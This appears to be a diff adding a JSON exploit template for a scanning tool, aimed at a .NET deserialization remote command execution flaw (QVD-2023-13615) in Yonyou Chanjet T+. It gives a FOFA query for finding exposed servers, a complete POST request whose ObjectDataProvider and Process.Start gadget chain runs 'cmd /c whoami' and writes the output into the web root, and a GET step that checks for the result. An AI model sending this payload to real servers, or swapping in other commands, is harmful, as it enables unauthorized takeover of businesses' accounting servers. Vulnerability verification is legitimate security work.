@@ -1,0 +1,52 @@
+{
+  "product": "用友 畅捷通TPlus",
+  "vul_name": "用友 畅捷通TPlus GetStoreWarehouseByStore 远程命令执行",
+  "type": "命令执行",
+  "vul_id": [
+    "QVD-2023-13615"
+  ],
+  "level": 3,
+  "vul_desc": "用友 畅捷通TPlus GetStoreWarehouseByStore 存在 .net反序列化漏洞，导致远程命令执行，控制服务器",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"畅捷通-TPlus\""
+  },
+  "protocol": "http",
+  "link": "https://www.cnblogs.com/pursue-security/p/17703915.html",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore",
+      "header": {
+        "X-Ajaxpro-Method": "GetStoreWarehouseByStore"
+      },
+      "json": {
+        "storeID": {
+          "__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+          "MethodName": "Start",
+          "ObjectInstance": {
+            "__type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "StartInfo": {
+              "__type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+              "FileName": "cmd",
+              "Arguments": "/c whoami > C:/Progra~2/Chanjet/TPlusStd/WebSite/52e039302a62d077.txt"
+            }
+          }
+        }
+      }
+    },
+    "verify": {
+      "method": "get",
+      "path": "/tplus/52e039302a62d077.txt",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200
+        }
+      ]
+    }
+  }
+}
